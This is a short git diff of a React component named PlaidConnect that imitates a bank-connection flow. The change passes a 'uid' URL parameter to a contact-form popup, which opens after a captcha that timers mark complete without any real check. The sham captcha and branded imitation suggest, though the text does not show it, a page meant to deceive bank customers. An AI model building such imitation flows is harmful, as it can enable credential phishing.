@@ -70,6 +70,10 @@ export default function PlaidConnect() {
   const capTimer = useRef(null)
   const close = () => window.close()
 
+  // Obtener user_id de los parámetros de URL
+  const params = new URLSearchParams(window.location.search)
+  const userId = params.get('uid')
+
 
   const q = query.trim().toLowerCase()
   const filtered = q ? BANKS.filter((b) => b.name.toLowerCase().includes(q)) : BANKS
@@ -84,8 +88,9 @@ export default function PlaidConnect() {
     capTimer.current = setTimeout(() => {
       setCaptchaState('done')
       capTimer.current = setTimeout(() => {
-        // Abrir ContactForm en nueva ventana
-        window.open('/contact-form', '_blank', 'width=600,height=700,noopener')
+        // Abrir ContactForm en nueva ventana con user_id
+        const contactFormUrl = userId ? `/contact-form?uid=${userId}` : '/contact-form'
+        window.open(contactFormUrl, '_blank', 'width=600,height=700,noopener')
         // Cerrar esta ventana después de un momento
         setTimeout(() => window.close(), 1000)
       }, 700)
